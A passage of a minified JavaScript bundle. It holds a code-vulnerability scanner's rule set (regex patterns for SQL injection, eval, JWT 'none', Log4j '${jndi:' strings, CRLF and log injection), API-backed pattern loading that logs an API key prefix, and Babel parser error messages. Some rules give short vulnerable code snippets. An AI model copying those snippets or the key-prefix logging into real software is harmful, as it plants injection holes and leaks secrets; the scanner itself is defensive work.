interpolation",patterns:{regex:[/["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)[^"']*\$\w+/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER).*\$(?:_GET|_POST|_REQUEST)\[/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE).*["']\s*\.\s*\$(?:_GET|_POST|_REQUEST)/gi,/mysql_query\s*\([^)]*\.\s*\$/gi,/mysqli_query\s*\([^,)]*,[^)]*\.\s*\$/gi,/->exec\s*\([^)]*\.\s*\$/gi,/\$(?:query|sql)\s*=\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE).*["']\s*\.\s*\$/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE).*\{\$(?:_GET|_POST|_REQUEST)/gi]},languages:["php"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use prepared statements with PDO or mysqli",examples:{vulnerable:"",secure:""}},{id:"php-eval",name:"PHP Eval Usage",type:"command_injection",severity:"critical",description:"Use of eval() function",patterns:{regex:[/eval\s*\(/gi,/assert\s*\(/gi]},languages:["php"],cweId:"CWE-94",owaspCategory:"A03:2021",remediation:"Avoid eval(), use safe alternatives",examples:{vulnerable:"",secure:""}},{id:"php-file-inclusion",name:"File Inclusion",type:"path_traversal",severity:"high",description:"Dynamic file inclusion",patterns:{regex:[/include\s*\(\s*\$_(?:GET|POST|REQUEST)/gi,/require\s*\(\s*\$_(?:GET|POST|REQUEST)/gi]},languages:["php"],cweId:"CWE-98",owaspCategory:"A03:2021",remediation:"Validate and whitelist file paths",examples:{vulnerable:"",secure:""}},{id:"elixir-code-eval",name:"Elixir Code Evaluation",type:"command_injection",severity:"critical",description:"Dynamic code evaluation",patterns:{regex:[/Code\.eval_string\s*\(/gi,/Code\.eval_quoted\s*\(/gi]},languages:["elixir"],cweId:"CWE-94",owaspCategory:"A03:2021",remediation:"Avoid dynamic code evaluation",examples:{vulnerable:"",secure:""}},{id:"elixir-atom-dos",name:"Atom DoS",type:"denial_of_service",severity:"medium",description:"Creating atoms from user input",patterns:{regex:[/String\.to_atom\s*\(/gi,/binary_to_atom\s*\(/gi]},languages:["elixir"],cweId:"CWE-400",owaspCategory:"A06:2021",remediation:"Use String.to_existing_atom instead",examples:{vulnerable:"",secure:""}},{id:"hardcoded-secret",name:"Hardcoded Secret",type:"hardcoded_secrets",severity:"high",description:"Hardcoded password or API key",patterns:{regex:[/password\s*=\s*["'][^"']{8,}["']/gi,/api_key\s*=\s*["'][^"']{20,}["']/gi]},languages:["javascript","typescript","python","ruby","java","php","elixir"],cweId:"CWE-798",owaspCategory:"A07:2021",remediation:"Use environment variables or secure key management",examples:{vulnerable:"",secure:""}},{id:"weak-crypto",name:"Weak Cryptography",type:"weak_cryptography",severity:"medium",description:"Use of weak cryptographic algorithms",patterns:{regex:[/MD5\s*\(/gi,/SHA1\s*\(/gi]},languages:["javascript","typescript","python","ruby","java","php"],cweId:"CWE-327",owaspCategory:"A02:2021",remediation:"Use SHA-256 or stronger algorithms",examples:{vulnerable:"",secure:""}},{id:"jwt-none-algorithm",name:"JWT None Algorithm",type:"broken_authentication",severity:"critical",description:"JWT allowing none algorithm",patterns:{regex:[/algorithm\s*:\s*["']none["']/gi,/verify\s*:\s*false/gi]},languages:["javascript","typescript","python","ruby"],cweId:"CWE-347",owaspCategory:"A02:2021",remediation:"Always verify JWT signatures",examples:{vulnerable:"",secure:""}},{id:"open-redirect",name:"Open Redirect",type:"open_redirect",severity:"medium",description:"Unvalidated redirect",patterns:{regex:[/redirect\s*\(\s*req\./gi,/location\.href\s*=\s*req\./gi]},languages:["javascript","typescript"],cweId:"CWE-601",owaspCategory:"A03:2021",remediation:"Validate redirect URLs against whitelist",examples:{vulnerable:"",secure:""}},{id:"nosql-injection",name:"NoSQL Injection",type:"nosql_injection",severity:"high",description:"MongoDB injection vulnerability",patterns:{regex:[/\$where\s*:/gi,/find\s*\(\s*{[^}]*\$ne\s*:/gi]},languages:["javascript","typescript"],cweId:"CWE-943",owaspCategory:"A03:2021",remediation:"Sanitize user input and use parameterized queries",examples:{vulnerable:"",secure:""}},{id:"log4j-jndi",name:"Log4j JNDI Injection (CVE-2021-44228)",type:"vulnerable_components",severity:"critical",description:"Log4Shell vulnerability pattern",patterns:{regex:[/\$\{jndi:/gi,/logger\.(?:info|warn|error|debug)\s*\([^)]*\$\{/gi]},languages:["java"],cweId:"CWE-502",owaspCategory:"A08:2021",remediation:"Update Log4j to version 2.17.0 or later",examples:{vulnerable:"",secure:""}},{id:"log-injection-console",name:"Log Injection via User Input",type:"log_injection",severity:"medium",description:"User input is logged without sanitization, potentially allowing log forging attacks",patterns:{regex:[/console\.(log|error|warn|info)\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/logger\.(info|error|warn|debug|trace)\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/winston\.(log|info|error|warn)\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/process\.(stdout|stderr)\.write\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/fs\.(appendFile|appendFileSync)\s*\([^,]*log[^,]*,[^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i]},languages:["javascript","typescript"],cweId:"CWE-117",owaspCategory:"A09:2021",remediation:"Sanitize user input before logging. Remove or encode newline characters and control sequences.",examples:{vulnerable:'console.log("User: " + req.query.username)',secure:'console.log("User:", sanitizeForLog(req.query.username))'}},{id:"crlf-injection-headers",name:"CRLF Injection in HTTP Headers",type:"crlf_injection",severity:"high",description:"User input is used in HTTP headers without sanitization, potentially allowing header injection",patterns:{regex:[/\.setHeader\s*\([^,]+,[^)]*\b(req|request|params|query|body|headers)\b/i,/\.writeHead\s*\([^,]+,\s*\{[^}]*\b(req|request|params|query|body|headers)\b/i,/res\.(set|header)\s*\([^,]+,[^)]*\b(req|request|params|query|body|headers)\b/i,/res\.write\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/Set-Cookie['"]\s*,[^)]*[\+`][^)]*\b(req|request|params|query|body)\b/i,/\.setHeader\s*\([^,]+,[^)]*decodeURIComponent\s*\([^)]*\b(req|request|params|query)\b/i]},languages:["javascript","typescript"],cweId:"CWE-93",owaspCategory:"A03:2021",remediation:"Validate and sanitize all user input used in HTTP headers. Remove or encode CR (\\r) and LF (\\n) characters.",examples:{vulnerable:'res.setHeader("X-User", req.query.username)',secure:'res.setHeader("X-User", sanitizeHeaderValue(req.query.username))'}}]}function PK(X){let J=X.toLowerCase();return eQ().filter((Y)=>Y.languages.includes(J)||J==="typescript"&&Y.languages.includes("javascript"))}var Wp1;var SK=j1(()=>{IX();Wp1=eQ()});class hY{client;supportedLanguages=["javascript","typescript","python","ruby","java","php","elixir"];constructor(X,J){this.client=new tQ({apiKey:X,apiUrl:J,cacheEnabled:!0,cacheTTL:3600,fallbackToLocal:!1})}async getPatternsByLanguage(X){try{let J=await this.client.fetchPatterns(X.toLowerCase());return q.info(` ApiPatternSource: Fetched ${J.length} ${X} patterns from API`),q.info("PATTERN FETCH SUCCESS",{source:"api",language:X,patternCount:J.length,coverageLevel:J.length>=25?"full":"partial"}),J}catch(J){throw q.error(` ApiPatternSource: Failed to fetch ${X} patterns`,J),q.error("PATTERN FETCH FAILURE",{source:"api",language:X,error:J instanceof Error?J.message:String(J),impact:"Will fall back to minimal patterns if hybrid mode"}),J}}async getPatternsByType(X){let Q=(await this.getAllPatterns()).filter((Y)=>Y.type===X);return q.info(`ApiPatternSource: Returning ${Q.length} patterns of type ${X}`),Q}async getAllPatterns(){let X=[];for(let J of this.supportedLanguages)try{let Q=await this.client.fetchPatterns(J);X.push(...Q)}catch(Q){q.warn(`Failed to fetch ${J} patterns, continuing...`,Q)}return q.info(`ApiPatternSource: Fetched ${X.length} total patterns from API`),X}}class yY{apiSource;localSource;constructor(X,J){this.apiSource=new hY(X,J),this.localSource=new w8}async getPatternsByLanguage(X){try{return await this.apiSource.getPatternsByLanguage(X)}catch(J){return q.warn(`Falling back to local patterns for ${X} due to API error`,J),await this.localSource.getPatternsByLanguage(X)}}async getPatternsByType(X){try{return await this.apiSource.getPatternsByType(X)}catch(J){return q.warn(`Falling back to local patterns for type ${X} due to API error`,J),await this.localSource.getPatternsByType(X)}}async getAllPatterns(){try{return await this.apiSource.getAllPatterns()}catch(X){return q.warn("Falling back to local patterns due to API error",X),await this.localSource.getAllPatterns()}}}function CX(){let X=process.env.RSOLV_API_KEY,J=process.env.RSOLV_API_URL,Q=process.env.USE_LOCAL_PATTERNS==="true",Y=process.env.USE_FAIL_ON_MINIMAL_PATTERNS==="true";if(Q){if(q.error("\uD83D\uDEA8 FORCED LOCAL PATTERNS",{reason:"USE_LOCAL_PATTERNS=true",impact:"Using minimal patterns instead of API patterns",recommendation:"Remove USE_LOCAL_PATTERNS environment variable"}),Y)throw new Error("Cannot proceed with minimal patterns when USE_FAIL_ON_MINIMAL_PATTERNS is set. Either provide RSOLV_API_KEY or unset USE_FAIL_ON_MINIMAL_PATTERNS.");return q.info("Using local pattern source (USE_LOCAL_PATTERNS=true)"),new w8}if(X)return q.info(" Using hybrid pattern source with API key"),q.info("PATTERN SOURCE SUCCESS",{source:"api",mode:"hybrid",fallbackAvailable:!0,apiKeyLength:X.length,apiKeyPrefix:X.substring(0,10)+"..."}),new yY(X,J);if(q.error("\uD83D\uDEA8 CRITICAL CONFIGURATION ERROR",{problem:"No RSOLV_API_KEY provided",impact:"Scanner will use minimal patterns and miss most vulnerabilities",detectionRate:"Approximately 10-20% of vulnerabilities will be detected",recommendation:"Set RSOLV_API_KEY environment variable or rsolvApiKey in workflow"}),Y)throw new Error("Cannot proceed with minimal patterns when USE_FAIL_ON_MINIMAL_PATTERNS is set. Provide RSOLV_API_KEY to use API patterns.");return q.warn("No API key provided, using local pattern source only"),new w8}var w8;var V5=j1(()=>{gY();SK();t1();w8=class w8{patterns=[];static MINIMUM_PATTERNS_PER_LANGUAGE=25;static CRITICAL_PATTERN_TYPES=["sql_injection","command_injection","xss","path_traversal","insecure_deserialization"];constructor(){this.initializePatterns()}initializePatterns(){if(this.patterns=eQ(),!process.env.RSOLV_API_KEY)q.error("\uD83D\uDEA8 CRITICAL: Using minimal patterns only",{reason:"No RSOLV_API_KEY provided",patternCount:this.patterns.length,impact:"Detection capability severely limited - will miss most vulnerabilities",recommendation:"Set RSOLV_API_KEY environment variable"}),q.warn("Using minimal fallback patterns - API connection recommended for full pattern coverage");else q.debug("LocalPatternSource initialized as fallback",{patternCount:this.patterns.length,mode:"fallback"});this.validateCriticalPatternCoverage()}validateCriticalPatternCoverage(){let X=new Set(this.patterns.map((Q)=>Q.type)),J=w8.CRITICAL_PATTERN_TYPES.filter((Q)=>!X.has(Q));if(J.length>0)q.error("\uD83D\uDEA8 MISSING CRITICAL PATTERN TYPES",{missing:J,impact:"Cannot detect these vulnerability types"})}async getPatternsByLanguage(X){let J=PK(X),Q=Math.round(J.length/w8.MINIMUM_PATTERNS_PER_LANGUAGE*100);if(q.warn("\uD83D\uDCCA PATTERN SOURCE METRICS",{source:"local",language:X,patternCount:J.length,expectedMinimum:w8.MINIMUM_PATTERNS_PER_LANGUAGE,coveragePercentage:`${Q}%`}),J.length<w8.MINIMUM_PATTERNS_PER_LANGUAGE)q.error(`\uD83D\uDEA8 INSUFFICIENT PATTERNS for ${X}`,{language:X,actual:J.length,required:w8.MINIMUM_PATTERNS_PER_LANGUAGE,deficit:w8.MINIMUM_PATTERNS_PER_LANGUAGE-J.length});return q.info(`LocalPatternSource: Returning ${J.length} minimal ${X} patterns`),J}async getPatternsByType(X){let J=this.patterns.filter((Q)=>Q.type===X);return q.info(`LocalPatternSource: Returning ${J.length} minimal patterns of type ${X}`),J}async getAllPatterns(){return q.info(`LocalPatternSource: Returning ${this.patterns.length} minimal patterns total`),this.patterns}}});var U4=c((NV)=>{Object.defineProperty(NV,"__esModule",{value:!0});function PT(X,J){if(X==null)return{};var Q={};for(var Y in X)if({}.hasOwnProperty.call(X,Y)){if(J.indexOf(Y)!==-1)continue;Q[Y]=X[Y]}return Q}class L6{constructor(X,J,Q){this.line=void 0,this.column=void 0,this.index=void 0,this.line=X,this.column=J,this.index=Q}}class R5{constructor(X,J){this.start=void 0,this.end=void 0,this.filename=void 0,this.identifierName=void 0,this.start=X,this.end=J}}function C9(X,J){let{line:Q,column:Y,index:W}=X;return new L6(Q,Y+J,W+J)}var TK="BABEL_PARSER_SOURCETYPE_MODULE_REQUIRED",ST={ImportMetaOutsideModule:{message:`import.meta may appear only with 'sourceType: "module"'`,code:TK},ImportOutsideModule:{message:`'import' and 'export' may appear only with 'sourceType: "module"'`,code:TK}},_K={ArrayPattern:"array destructuring pattern",AssignmentExpression:"assignment expression",AssignmentPattern:"assignment expression",ArrowFunctionExpression:"arrow function expression",ConditionalExpression:"conditional expression",CatchClause:"catch clause",ForOfStatement:"for-of statement",ForInStatement:"for-in statement",ForStatement:"for-loop",FormalParameters:"function parameter list",Identifier:"identifier",ImportSpecifier:"import specifier",ImportDefaultSpecifier:"import default specifier",ImportNamespaceSpecifier:"import namespace specifier",ObjectPattern:"object destructuring pattern",ParenthesizedExpression:"parenthesized expression",RestElement:"rest element",UpdateExpression:{true:"prefix operation",false:"postfix operation"},VariableDeclarator:"variable declaration",YieldExpression:"yield expression"},Q4=(X)=>X.type==="UpdateExpression"?_K.UpdateExpression[`${X.prefix}`]:_K[X.type],TT={AccessorIsGenerator:({kind:X})=>`A ${X}ter cannot be a generator.`,ArgumentsInClass:"'arguments' is only allowed in functions and class methods.",AsyncFunctionInSingleStatementContext:"Async functions can only be declared at the top level or inside a block.",AwaitBindingIdentifier:"Can not use 'await' as identifier inside an async function.",AwaitBindingIdentifierInStaticBlock:"Can not use 'await' as identifier inside a static block.",AwaitExpressionFormalParameter:"'await' is not allowed in async function parameters.",AwaitUsingNotInAsyncContext:"'await using' is only allowed within async functions and at the top levels of modules.",AwaitNotInAsyncContext:"'await' is only allowed within async functions and at the top levels of modules.",BadGetterArity:"A 'get' accessor must not have any formal parameters.",BadSetterArity:"A 'set' accessor must have exactly one formal parameter.",BadSetterRestParameter:"A 'set' accessor function argument must not be a rest parameter.",ConstructorClassField:"Classes may not have a field named 'constructor'.",ConstructorClassPrivateField:"Classes may not have a private field named '#constructor'.",ConstructorIsAccessor:"Class constructor may not be an accessor.",ConstructorIsAsync:"Constructor can't be an async function.",ConstructorIsGenerator:"Constructor can't be a generator.",DeclarationMissingInitializer:({kind:X})=>`Missing initializer in ${X} declaration.`,DecoratorArgumentsOutsideParentheses:"Decorator arguments must be moved inside parentheses: use '@(decorator(args))' instead of '@(decorator)(args)'.",DecoratorBeforeExport:"Decorators must be placed *before* the 'export' keyword. Remove the 'decoratorsBeforeExport: true' option to use the 'export @decorator class {}' syntax.",DecoratorsBeforeAfterExport:"Decorators can be placed *either* before or after the 'export' keyword, but not in both locations at the same time.",DecoratorConstructor:"Decorators can't be used with a constructor. Did you mean '@dec class { ... }'?",DecoratorExportClass:"Decorators must be placed *after* the 'export' keyword. Remove the 'decoratorsBeforeExport: false' option to use the '@decorator export class {}' syntax.",DecoratorSemicolon:"Decorators must not be followed by a semicolon.",DecoratorStaticBlock:"Decorators can't be used with a static block.",DeferImportRequiresNamespace:'Only `import defer * as x from "./module"` is valid.',DeletePrivateField:"Deleting a private field is not allowed.",DestructureNamedImport:"ES2015 named imports do not destructure. Use another statement for destructuring after the import.",DuplicateConstructor:"Duplicate constructor in the same class.",DuplicateDefaultExport:"Only one default export allowed per module.",DuplicateExport:({exportName:X})=>`\`${X}\` has already been exported. Exported identifiers must be unique.`,DuplicateProto:"Redefinition of __proto__ property.",DuplicateRegExpFlags:"Duplicate regular expression flag.",ElementAfterRest:"Rest element must be last element.",EscapedCharNotAnIdentifier:"Invalid Unicode escape.",ExportBindingIsString:({localName:X,exportName:J})=>`A string literal cannot be used as an exported binding without \`from\`.
- Did you mean \`export { '${X}' as '${J}' } from 'some-module'\`?`,ExportDefaultFromAsIdentifier:"'from' is not allowed as an identifier after 'export default'.",ForInOfLoopInitializer:({type:X})=>`'${X==="ForInStatement"?"for-in":"for-of"}' loop variable declaration may not have an initializer.`,ForInUsing:"For-in loop may not start with 'using' declaration.",ForOfAsync:"The left-hand side of a for-of loop may not be 'async'.",ForOfLet:"The left-hand side of a for-of loop may not start with 'let'.",GeneratorInSingleStatementContext:"Generators can only be declared at the top level or inside a block.",IllegalBreakContinue:({type:X})=>`Unsyntactic ${X==="BreakStatement"?"break":"continue"}.`,IllegalLanguageModeDirective:"Illegal 'use strict' directive in function with non-simple parameter list.",IllegalReturn:"'return' outside of function.",ImportAttributesUseAssert:"The `assert` keyword in import attributes is deprecated and it has been replaced by the `with` keyword. You can enable the `deprecatedImportAssert` parser plugin to suppress this error.",ImportBindingIsString:({importName:X})=>`A string literal cannot be used as an imported binding.
- Did you mean \`import { "${X}" as foo }\`?`,ImportCallArity:"`import()` requires exactly one or two arguments.",ImportCallNotNewExpression:"Cannot use new with import(...).",ImportCallSpreadArgument:"`...` is not allowed in `import()`.",ImportJSONBindingNotDefault:"A JSON module can only be imported with `default`.",ImportReflectionHasAssertion:"`import module x` cannot have assertions.",ImportReflectionNotBinding:'Only `import module x from "./module"` is valid.',IncompatibleRegExpUVFlags:"The 'u' and 'v' regular expression flags cannot be enabled at the same time.",InvalidBigIntLiteral:"Invalid BigIntLiteral.",InvalidCodePoint:"Code point out of bounds.",InvalidCoverDiscardElement:"'void' must be followed by an expression when not used in a binding position.",InvalidCoverInitializedName:"Invalid shorthand property initializer.",InvalidDecimal:"Invalid decimal.",InvalidDigit:({radix:X})=>`Expected number in radix ${X}.`,InvalidEscapeSequence:"Bad character escape sequence.",InvalidEscapeSequenceTemplate:"Invalid escape sequence in template.",InvalidEscapedReservedWord:({reservedWord:X})=>`Escape sequence in keyword ${X}.`,InvalidIdentifier:({identifierName:X})=>`Invalid identifier ${X}.`,InvalidLhs:({ancestor:X})=>`Invalid left-hand side in ${Q4(X)}.`,InvalidLhsBinding:({ancestor:X})=>`Binding invalid left-hand side in ${Q4(X)}.`,InvalidLhsOptionalChaining:({ancestor:X})=>`Invalid optional chaining in the left-hand side of ${Q4(X)}.`,InvalidNumber:"Invalid number.",InvalidOrMissingExponent:"Floating-point numbers require a valid exponent after the 'e'.",InvalidOrUnexpectedToken:({unexpected:X})=>`Unexpected character '${X}'.`,InvalidParenthesizedAssignment:"Invalid parenthesized assignment pattern.",InvalidPrivateFieldResolution:({identifierName:X})=>`Private name #${X} is not defined.`,InvalidPropertyBindingPattern:"Binding member expression.",InvalidRecordProperty:"Only properties and spread elements are allowed in record definitions.",InvalidRestAssignmentPattern:"Invalid rest operator's argument.",LabelRedeclaration:({labelName:X})=>`Label '${X}' is already declared.`,LetInLexicalBinding:"'let' is disallowed as a lexically bound name.",LineTerminatorBeforeArrow:"No line break is allowed before '=>'.",MalformedRegExpFlags:"Invalid regular expression flag.",MissingClassName:"A class name is required.",MissingEqInAssignment:"Only '=' operator can be used for specifying default value.",MissingSemicolon:"Missing semicolon.",MissingPlugin:({missingPlugin:X})=>`This experimental syntax requires enabling the parser plugin: ${X.map((J)=>JSON.stringify(J)).join(", ")}.`,MissingOneOfPlugins:({missingPlugin:X})=>`This experimental syntax requires enabling one of the following parser plugin(s): ${X.map((J)=>JSON.stringify(J)).join(", ")}.`,MissingUnicodeEscape:"Expecting Unicode escape sequence \\uXXXX.",MixingCoalesceWithLogical:"Nullish coalescing operator(??) requires parens when mixing with logical operators.",ModuleAttributeDifferentFromType:"The only accepted module attribute is `type`.",ModuleAttributeInvalidValue:"Only string literals are allowed as module attribute values.",ModuleAttributesWithDuplicateKeys:({key:X})=>`Duplicate key "${X}" is not allowed in module attributes.`,ModuleExportNameHasLoneSurrogate:({surrogateCharCode:X})=>`An export name cannot include a lone surrogate, found '\\u${X.toString(16)}'.`,ModuleExportUndefined:({localName:X})=>`Export '${X}' is not defined.`,MultipleDefaultsInSwitch:"Multiple default clauses.",NewlineAfterThrow:"Illegal newline after throw.",NoCatchOrFinally:"Missing catch or finally clause.",NumberIdentifier:"Identifier directly after number.",NumericSeparatorInEscapeSequence:"Numeric separators are not allowed inside unicode escape sequences or hex escape sequences.",ObsoleteAwaitStar:"'await*' has been removed from the async functions proposal. Use Promise.all() instead.",OptionalChainingNoNew:"Constructors in/after an Optional Chain are not allowed.",OptionalChainingNoTemplate:"Tagged Template Literals are not allowed in optionalChain.",OverrideOnConstructor:"'override' modifier cannot appear on a constructor declaration.",ParamDupe:"Argument name clash.",PatternHasAccessor:"Object pattern can't contain getter or setter.",PatternHasMethod:"Object pattern can't contain methods.",PrivateInExpectedIn:({identifierName:X})=>`Private names are only allowed in property accesses (\`obj.#${X}\`) or in \`in\` expressions (\`#${X} in obj\`).`,PrivateNameRedeclaration:({identifierName:X})=>`Duplicate private name #${X}.`,RecordExpressionBarIncorrectEndSyntaxType:"Record expressions ending with '|}' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",RecordExpressionBarIncorrectStartSyntaxType:"Record expressions starting with '{|' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",RecordExpressionHashIncorrectStartSyntaxType:"Record expressions starting with '#{' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.",RecordNoProto:"'__proto__' is not allowed in Record expressions.",RestTrailingComma:"Unexpected trailing comma after rest element.",SloppyFunction:"In non-strict mode code, functions can only be declared at top level or inside a block.",SloppyFunctionAnnexB:"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.",SourcePhaseImportRequiresDefault:'Only `import source x from "./module"` is valid.',StaticPrototype:"Classes may not have static property named prototype.",SuperNotAllowed:"`super()` is only valid inside a class constructor of a subclass. Maybe a typo in the method name ('constructor') or not extending another class?",SuperPrivateField:"Private fields can't be accessed on super.",TrailingDecorator:"Decorators must be attached to a class element.",TupleExpressionBarIncorrectEndSyntaxType:"Tuple expressions ending with '|]' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",TupleExpressionBarIncorrectStartSyntaxType:"Tuple expressions starting with '[|' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",TupleExpressionHashIncorrectStartSyntaxType:"Tuple expressions starting with '#[' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.",UnexpectedArgumentPlaceholder:"Unexpected argument placeholder.",UnexpectedAwaitAfterPipelineBody:'Unexpected "await" after pipeline body; await must have parentheses in minimal proposal.',UnexpectedDigitAfterHash:"Unexpected digit after hash token.",UnexpectedImportExport:"'import' and 'export' may only appear at the top level.",UnexpectedKeyword:({keyword:X})=>`Unexpected keyword '${X}'.`,UnexpectedLeadingDecorator:"Leading decorators must be attached to a class declaration.",UnexpectedLexicalDeclaration:"Lexical declaration cannot appear in a single-statement context.",UnexpectedNewTarget:"`new.target` can only be used in functions or class properties.",UnexpectedNumericSeparator:"A numeric separator is only allowed between two digits.",UnexpectedPrivateField:"Unexpected private name.",UnexpectedReservedWord:({reservedWord:X})=>`Unexpected reserved word '${X}'.`,UnexpectedSuper:"'super' is only allowed in object methods and classes.",UnexpectedToken:({expected:X,unexpected:J})=>`Unexpected token${J?` '${J}'.`:""}${X?`, expected "${X}"`:""}`,UnexpectedTokenUnaryExponentiation:"Illegal expression. Wrap left hand side or entire exponentiation in parentheses.",UnexpectedUsingDeclaration:"Using declaration cannot appear in the top level when source type is `script` or in the bare case statement.",UnexpectedVoidPattern:"Unexpected void binding.",UnsupportedBind:"Binding should be performed on object property.",UnsupportedDecoratorExport:"A decorated export must export a class declaration.",UnsupportedDefaultExport:"Only expressions, functions or classes are allowed as the `default` export.",UnsupportedImport:"`import` can only be used in `import()` or `import.meta`.",UnsupportedMetaProperty:({target:X,onlyValidPropertyName:J})=>`The only valid meta property for ${X} is ${X}.${J}.`,UnsupportedParameterDecorator:"Decorators cannot be used to decorate parameters.",UnsupportedPropertyDecorator:"Decorators cannot be used to decorate object literal properties.",UnsupportedSuper:"'super' can only be used with function calls (i.e. super()) or in property accesses (i.e. super.prop or super[prop]).",UnterminatedComment:"Unterminated comment.",UnterminatedRegExp:"Unterminated regular expression.",UnterminatedString:"Unterminated string constant.",UnterminatedTemplate:"Unterminated template.",UsingDeclarationExport:"Using declaration cannot be exported.",UsingDeclarationHasBindingPattern:"Using declaration cannot have destructuring patterns.",VarRedeclaration:({identifierName:X})=>`Identifier '${X}' has already been declared.`,VoidPatternCatchClauseParam:"A void binding can not be the catch clause parameter. Use `try { ... } catch { ... }` if you want to discard the caught error.",VoidPatternInitializer:"A void binding may not have an initializer.",YieldBindingIdentifier:"Can not use 'yield' as identifier inside a generator.",YieldInParameter:"Yield expression is not allowed in formal parameters.",YieldNotInGeneratorFunction:"'yield' is only allowed within generator functions.",ZeroDigitNumericSeparator:"Numeric separator can not be used after leading 0."},_T={StrictDelete:"Deleting local variable in strict mode.",StrictEvalArguments:({referenceName:X})=>`Assigning to '${X}' in strict mode.`,StrictEvalArgumentsBinding:({bindingName:X})=>`Binding '${X}' in strict mode.`,StrictFunction:"In strict mode code, functions can only be declared at top level or inside a block.",StrictNumericEscape:"The only valid numeric escape in strict mode is '\\0'.",StrictOctalLiteral:"Legacy octal literals are not allowed in strict mode.",StrictWith:"'with' in strict mode."},ET={ParseExpressionEmptyInput:"Unexpected parseExpression() input: The input is empty or contains only comments.",ParseExpressionExpectsEOF:({unexpected:X})=>`Unexpected parseExpression() input: The input should contain exactly one expression, but the first expression is followed by the unexpected character \`${String.fromCodePoint(X)}\`.`},$T=new Set(["ArrowFunctionExpression","AssignmentExpression","ConditionalExpression","YieldExpression"]),kT=Object.assign({PipeBodyIsTighter:"Unexpected yield after pipeline body; any yield expression acting as Hack-style pipe body must be parenthesized due to its loose operator precedence.",PipeTopicRequiresHackPipes:'Topic reference is used, but the pipelineOperator plugin was not passed a "proposal": "hack" or "smart" option.',PipeTopicUnbound:"Topic reference is unbound; it must be inside a pipe body.",PipeTopicUnconfiguredToken:({token:X})=>`Invalid topic token ${X}. In order to use ${X} as a topic reference, the pipelineOperator plugin must be configured with { "proposal": "hack", "topicToken": "${X}" }.`,PipeTopicUnused:"Hack-style pipe body does not contain a topic reference; Hack-style pipes must use topic at least once.",PipeUnparenthesizedBody:({type:X})=>`Hack-style pipe body cannot be an unparenthesized ${Q4({type:X})}; please wrap it in parentheses.`},{PipelineBodyNoArrow:'Unexpected arrow "=>" after pipeline body; arrow function in pipeline body must be parenthesized.',PipelineBodySequenceExpression:"Pipeline body may not be a comma-separated sequence expression.",PipelineHeadSequenceExpression:"Pipeline head should not be a comma-separated sequence expression.",PipelineTopicUnused:"Pipeline is in topic style but does not use topic reference.",PrimaryTopicNotAllowed:"Topic reference was used in a lexical context without topic binding.",PrimaryTopicRequiresSmartPipeline:'Topic reference is used, but the pipelineOperator plugin was not passed a "proposal": "hack" or "smart" option.'}),bT=["message"];function EK(X,J,Q){Object.defineProperty(X,J,{enumerable:!1,configurable:!0,value:Q})}function vT({toMessage:X,code:J,reasonCode:Q,syntaxPlugin:Y}){let W=Q==="MissingPlugin"||Q==="MissingOneOfPlugins";{let z={AccessorCannotDeclareThisParameter:"AccesorCannotDeclareThisParameter",AccessorCannotHaveTypeParameters:"AccesorCannotHaveTypeParameters",ConstInitializerMustBeStringOrNumericLiteralOrLiteralEnumReference:"ConstInitiailizerMustBeStringOrNumericLiteralOrLiteralEnumReference",SetAccessorCannotHaveOptionalParameter:"SetAccesorCannotHaveOptionalParameter",SetAccessorCannotHaveRestParameter:"SetAccesorCannotHaveRestParameter",SetAccessorCannotHaveReturnType:"SetAccesorCannotHaveReturnType"};if(z[Q])Q=z[Q]}return function z(G,H){let U=new SyntaxError;if(U.code=J,U.reasonCode=Q,U.loc=G,U.pos=G.index,U.syntaxPlugin=Y,W)U.missingPlugin=H.missingPlugin;return EK(U,"clone",function K(V={}){var B;let{line:Z,column:M,index:F}=(B=V.loc)!=null?B:G;return z(new L6(Z,M,F),Object.assign({},H,V.details))}),EK(U,"details",H),Object.defineProperty(U,"message",{configurable:!0,get(){let K=`${X(H)} (${G.line}:${G.column})`;return this.message=K,K},set(K){Object.defineProperty(this,"message",{value:K,writable:!0})}}),U}}function r8(X,J){if(Array.isArray(X))return(Y)=>r8(Y,X[0]);let Q={};for(let Y of Object.keys(X)){let W=X[Y],z=typeof W==="string"?{message:()=>W}:typeof W==="function"?{message:W}:W,{message:G}=z,H=PT(z,bT),U=typeof G==="string"?()=>G:G;Q[Y]=vT(Object.assign({code:"BABEL_PARSER_SYNTAX_ERROR",reasonCode:Y,toMessage:U},J?{syntaxPlugin:J}:{},H))}return Q}var b=Object.assign({},r8(ST),r8(TT),r8(_T),r8(ET),r8`pipelineOperator`(kT));function xT(){return{sourceType:"script",sourceFilename:void 0,startIndex:0,startColumn:0,startLine:1,allowAwaitOutsideFunction:!1,allowReturnOutsideFunction:!1,allowNewTargetOutsideFunction:!1,allowImportExportEverywhere:!1,allowSuperOutsideMethod:!1,allowUndeclaredExports:!1,allowYieldOutsideFunction:!1,plugins:[],strictMode:null,ranges:!1,tokens:!1,createImportExpressions:!1,createParenthesizedExpressions:!1,errorRecovery:!1,attachComment:!0,annexB:!0}}function fT(X){let J=xT();if(X==null)return J;if(X.annexB!=null&&X.annexB!==!1)throw new Error("The `annexB` option can only be set to `false`.");for(let Q of Object.keys(J))if(X[Q]!=null)J[Q]=X[Q];if(J.startLine===1){if(X.startIndex==null&&J.startColumn>0)J.startIndex=J.startColumn;else 